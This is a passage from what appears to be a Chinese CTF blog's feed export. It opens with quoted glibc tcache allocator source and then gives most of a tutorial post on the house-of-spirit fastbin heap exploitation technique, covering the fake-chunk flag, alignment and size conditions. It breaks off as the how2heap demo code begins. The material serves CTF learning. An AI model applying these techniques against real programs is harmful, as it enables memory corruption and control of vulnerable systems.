REVEAL_PTR (e-&gt;next);</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span></span><br><span class="line"><span class="meta">    tcache_init();</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Nothing to do if there is no thread cache.  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !USE_TCACHE  */</span></span></span><br></pre></td></tr></table></figure></details><details>    <summary>__libc_malloc中tcache相关代码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tcache_get (tc_idx);</span><br><span class="line">      <span class="keyword">return</span> TAG_NEW_USABLE (victim);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details><details>    <summary>_int_malloc中tcache_bin相关代码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              </span><br></pre></td></tr></table></figure></details><details>    <summary>int_free中tcache_bin检查key相关代码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>]]></content>
    
    
    <summary type="html">前言：堆卡了比较久，争取这个寒假突破瓶颈</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house of spirit-1</title>
    <link href="http://iyheart.github.io/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/"/>
    <id>http://iyheart.github.io/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/</id>
    <published>2025-01-13T15:28:57.000Z</published>
    <updated>2025-01-28T10:40:12.469Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://blog.csdn.net/qq_41202237/article/details/109284167">好好说话之Fastbin Attack（2）：House Of Spirit_fastbin attack house of spirit-CSDN博客</a></li><li>参考书籍：杨超的《CTF竞赛权威指南——pwn篇》</li><li>用到的仓库：github的how2heap仓库</li></ul><h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><ul><li><p>学习了<code>UAF</code>、<code>double_free</code>、<code>unlink</code>、<code>off-by-one</code>，之后基本上对堆稍微有点了解。</p></li><li><p>个人感觉，堆漏洞的成因就是<code>UAF</code>和<code>堆溢出</code>，而栈的漏洞的成因基本上就是<code>栈溢出</code>，其他的就是<code>格式化字符串漏洞</code>，漏洞的成因感觉就是这几种。但是利用方式很多，所以学来学去都是在学被人挖掘出来的利用方法。在学这些利用方法的时候会不由感慨，那些开创漏洞利用的人脑洞真大。所以怎么感觉pwn到最后变<code>misc</code>那些脑洞题了…</p></li><li><p>初步了解了一些漏洞成因和漏洞利用后，就可以开始学习<code>house of </code>系列的利用方法了。目前打算主线直接学习<code>house of</code>系列，按照<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">Glibc堆利用之house of系列总结 - roderick - record and learn!</a>这篇文章的顺序学习，学到哪些利用，之前没涉及到的再分出支线去学习。</p></li><li><p>堆的漏洞利用可以进行以下三种分类：这些分类相互有交集，并不互相独立，目前我做的是使用<code>house of</code>系列进行堆利用的分类，等<code>house of</code>系列学习完之后，有时间再进行其他的分类</p><ul><li><code>glibc</code>版本对应的漏洞利用，具体可以看<code>how2heap</code>这个github仓库<a href="https://github.com/shellphish/how2heap">shellphish/how2heap: A repository for learning various heap exploitation techniques.</a></li><li><code>house of</code>分类的漏洞利用</li><li><code>bins_attack</code>以及其他的<code>attack</code>分类利用</li></ul></li></ul><h1 id="house-of-spirit介绍"><a class="markdownIt-Anchor" href="#house-of-spirit介绍"></a> house-of-spirit介绍</h1><ul><li><code>house-of-spirit</code>是堆利用<code>house-of</code>系列的一种方法。这种方法目前只了解到是针对<code>fast_bin</code>的attack和<code>tcache_bin</code>的攻击，所以这个利用方法将被分成两个部分，第一个部分是介绍<code>glibc2.26</code>之前的还没有引入<code>tcache_bin</code>的攻击。第二部分是介绍<code>glibc2.26</code>之后引入了<code>tcache_bin</code>后针对<code>tcache_bin</code>的攻击</li><li>在学习<code>house-of-spirit</code>之前首先要对<code>Linux</code>下的堆管理器即<code>ptmalloc2</code>有一定的了解，还要知道<code>UAF</code>漏洞、<code>double_free</code>漏洞以及<code>off-by</code>的两种漏洞，能简单利用<code>UAF</code>和<code>double</code>、这个两个漏洞对<code>fast_bin</code>进行攻击和利用。这样就可以进一步学习<code>house-of-spirit</code>。</li><li>对于<code>house-of-spirit</code>这个漏洞，与对堆管理器中<code>unlink</code>的攻击关系其实不大。可以根据自己的节奏去选择学习顺序。</li><li>本次介绍的是对<code>glibc2.26</code>之前的版本还没引入<code>tcache_bin</code>,针对的是<code>fast_bin</code>的攻击。</li></ul><h2 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h2><ul><li>先来比较直观和简单地介绍一下<code>house-of-spirit</code>的利用方式。这个利用方式是<code>double_free</code>和<code>UAF</code>漏洞的进一步利用。</li><li>首先<code>house-of-spirit</code>的堆利用方式，是一种用于获得某块内存区域控制权的技术（即你可以实现对该块内存任意写入数据）。</li><li><code>house-of-spirit</code>是通过伪造一个堆块<code>fake_chunk</code>，并且有一个指针<code>ptr</code>指向该<code>fake_chunk</code>，加上我们可以使用<code>free()</code>函数，将指向这个<code>fake_chunk</code>的<code>ptr</code>指针给<code>free</code>掉，这时该<code>fake_chunk</code>的就会被放入<code>fast_bin</code>对应大小堆块的链表头部。当我们再次使用malloc函数使用一个堆块，这时<code>fake_chunk</code>就会被申请出来，被用户使用，这样我们就可以对该<code>fake_chunk</code>进行写入或者修改数据。</li><li>接下来通过图片来直观感受一下<code>house-of-spirit</code>的这个利用方式。</li><li>如图<code>fast_bin</code>链表这边有两个空闲的真<code>chunk</code>，并且都放在了<code>fast_bin</code>中。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114010748417.png" alt="image-20250114010748417"></p><ul><li>这时我们在某个内存空间中（可能是<code>.bss</code>段、<code>栈上</code>或者其他内存空间）伪造了一个chunk，称为<code>fake_chunk</code>，并且有一个指针<code>ptr</code>指向该<code>fake_chunk</code></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114011025340.png" alt="image-20250114011025340"></p><ul><li>恰好这个程序中的<code>free</code>函数能释放<code>ptr</code>这个指针。所以当我们释放<code>ptr</code>这个指针后，就会将这个<code>fake_chunk</code>放入<code>fast_bin</code>这个链表中（该链表采用头插法）</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114011236308.png" alt="image-20250114011236308"></p><ul><li>当我们再次使用<code>malooc</code>函数申请适当大小的内存，就可以将这个<code>fake_chunk</code>申请给用户写入数据。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114011712820.png" alt="image-20250114011712820"></p><ul><li>以上就是<code>house_of_spirit</code>的利用过程，现在来总结一下<code>house_of_spirit</code>的利用方式，以及<code>house_of_spirit</code>与<code>fast bin double free</code>的区别<ul><li><code>houser_of_spirit</code>是通过伪造一个堆块<code>fake_chunk</code>(该堆块并不是通过malloc申请回来的)，利用<code>free</code>的机制将该<code>fake_chunk</code>放入<code>fast_bin</code>链表之中，再次通过<code>malloc</code>将该<code>fake_chunk</code>申请，从而实现任意内存读写</li><li>而<code>double freee</code>是将本来通过malloc申请的堆块<code>chunk1</code>（该堆块是合法的），通过两次释放<code>chunk1</code>，将同一个堆块即<code>chunk1</code>放入两次到<code>fast_bin</code>中，这样我们第一次申请<code>chunk1</code>，就可以修改<code>chunk1</code>中的<code>fd</code>指针，使其指向任意内存地址，当我们再次申请<code>chunk1</code>时，这个任意内存就会被放入我们的<code>fast_bin</code>链表之中，再次使用<code>malloc</code>申请，我们就可以申请到任意内存并对该内存进行读写。</li><li>区别：<code>house_of_spirit</code>是构造<code>fake_chunk</code>想办法放入<code>bin</code>中链表，通过再次申请达到任意地址读写。而<code>double</code>是通过合法chunk的两次释放和两次申请，从而在第三次申请chunk时能申请到任意地址，对任意地址读写</li></ul></li></ul><h2 id="伪造条件"><a class="markdownIt-Anchor" href="#伪造条件"></a> 伪造条件</h2><ul><li><p>由于<code>free</code>的时候会对堆块进行检查，即验证堆块的合法性，所以我们在伪造堆块的时候就要满足一定的条件，这样才能绕过检查，继续进行<code>house_of_spirit</code>的利用。</p></li><li><p>接下来说明一下伪造需要满足的条件：<code>fake_chunk</code>标志位、<code>fake_chunk</code>的内存地址对齐、<code>fake_chunk</code>的size大小、<code>fake_chunk</code>的<code>next_chunk</code>的大小、<code>fake_chunk</code>的连续释放（即double_free的错误）</p></li><li><p><code>ptmalloc</code>所申请的堆块，数据结构如下：</p></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114041940424.png" alt="image-20250114041940424"></p><p><strong>fake_chunk的标志位</strong>：</p><ul><li>在伪造一个<code>fake_chunk</code>的时候,由于堆块结构中的<code>size</code>部分的最低三位是标志位，所以这些标志位要满足一下条件：<ul><li><code>P</code>标志位设置为<code>1</code>：该标志位表示的是该堆块物理地址上相邻的前一个堆块是否处于空闲状态，<code>1</code>表示处于使用状态。当标志位设置为<code>0</code>的时候就会在<code>free</code>的时候会触发<code>unlink</code>机制，导致合并一个不存在的地址空间，会引发程序的崩溃。<strong>有些题目好像不满足也可以，对P标志位要求没那么严格</strong></li><li><code>M</code>标志位设置为<code>0</code>：<code>M</code>标志位表示的是<code>IS_MAPPED</code>，记录当前chunk是否由mmap分配。当这个位置的标记设置为<code>1</code>，就表示这个堆块内存时调用<code>mmap</code>分配的，在处理这个chunk的时候就会单独处理。</li><li><code>N</code>标志位设置为<code>0</code>：一般攻击的都是主线程下的堆（目前还没有打过多线程的堆题），所以该标志位应该被设置为<code>0</code></li></ul></li></ul><p><strong>fake_chunk的内存对齐</strong>：</p><ul><li>堆内存在申请的时候都是8字节对齐或者16字节对齐的，也就是说<code>fake_chunk</code>的<code>prev_size</code>的最低位地址、<code>P</code>标志位对应的地址应该为<code>0xXXXXXXX0</code>。也就是需要16字节对齐。（32位程序下是<code>0xXXXXXXX8</code>，也就是8字节对齐）</li><li>在<code>free</code>的时候会对内存是否对齐进行检查，如果检查到所free的堆块内存没有对齐就会出现报错，或者是程序无法运行下去。</li></ul><p><strong>fake_chunk的size大小</strong>：</p><ul><li><code>fake_chunk</code>是要放入<code>fast_bin</code>中的，所以我们的<code>size</code>大小就要满足挂入<code>fast_bin</code>链表的要求，即<code>size</code>的大小要<code>小于0x80</code>字节</li><li>如果要放入<code>tcache_bin</code>中就要满足放入<code>tcache_bin</code>中的<code>size</code>大小</li><li>还需要注意一点就是<code>size</code>的值也必须是<code>16字节对齐</code>，即满足<code>0x10</code>的整数倍（32位程序要满足<code>0x8</code>字节对齐）</li></ul><p><strong>fake_chunk的next_chunk的大小</strong>：</p><ul><li>所谓<code>fake_chunk</code>的<code>next_chunk</code>指的就是与<code>fake_chunk</code>物理地址上相邻的且地址高于<code>fake_chunk</code>的一段内存空间（因为是伪造的堆块，所以该段内存空间其实不是堆块）</li><li>当我们释放<code>fake_chunk</code>的时候，会有一个检查机制，<code>ptmalloc2</code>会通过，如下计算确定<code>next_chunk</code>的地址，并对其<code>size</code>进行检查</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next_chunk_address = fake_chunk_address + fake_chunk-&gt;size</span><br></pre></td></tr></table></figure><ul><li>所以<code>next_chunk</code>的<code>size</code>大小应该为满足以下两个条件：<ul><li><code>size</code>要满足<code>0x10</code>字节对齐，即必须为16字节的整数倍（32位系统则是<code>0x8</code>字节对齐）</li><li><code>size</code>还要满足<code>小于128kb</code></li></ul></li><li>这样设置的目的就是在<code>chunk</code>连续释放的时候，能够保证伪造的<code>fake_chunk</code>在释放后能够挂在<code>fast_bin</code>中的<code>main_arena</code>的前面。这样我们再次使用<code>malloc</code>申请适当大小的堆块时，就会直接申请到<code>fake_chunk</code></li></ul><p><strong>fake_chunk的连续释放</strong>：</p><ul><li>在<code>double_free</code>中如果直接连续<code>free</code>相同的堆块，程序就会因为检测到<code>double_free</code>而无法运行，所以我们在进行<code>double_free</code>利用的时候就释放一次目标堆块后，要释放另一个堆块，之后才能再次释放目标堆块。这就是需要我们绕过<code>double_free</code>的检查机制</li><li>所以<code>fake_chunk</code>在释放完一次后，不能马上再进行释放，这样就会导致<code>double_free</code>检查不通过，导致程序无法运行。</li></ul><p><strong>总结</strong>：所以我们要构造的<code>fake_chunk</code>要满足如下条件</p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114050015128.png" alt="image-20250114050015128"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114050204075.png" alt="image-20250114050204075"></p><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>本实验的代码时在<code>how2heap</code>中<code>glibc2.23</code>版本的<code>house-of-spirit</code>，并通过阅读程序，模拟出攻击流程</li><li>我将其源码进行汉化，源码如下：</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 